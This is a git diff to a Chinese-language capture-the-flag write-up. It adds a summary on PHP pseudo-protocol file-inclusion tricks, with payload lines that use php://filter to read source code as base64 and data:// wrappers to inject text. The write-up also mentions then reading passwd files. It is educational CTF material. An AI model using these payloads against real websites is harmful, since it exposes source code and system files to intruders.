@@ -28,4 +28,9 @@ echo "hello world!";
 ```
 
 ## 总结
-这种题目一定要抓住关键词，本题给了**hello关键字**，应该立马联想到伪协议读取hello，然后再读取passwd等文件
+这种题目一定要抓住关键词，本题给了**hello关键字**，应该立马联想到伪协议读取hello，然后再读取passwd等文件  
+[php伪协议漏洞](https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/)  
+**data伪协议写入文件，php://filter用于读取源码，php://input用于执行php代码**
+- file=php://filter/read=convert.base64-encode/resource=useless.php
+- text=data://text/plain,welcome to the zjctf
+- text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
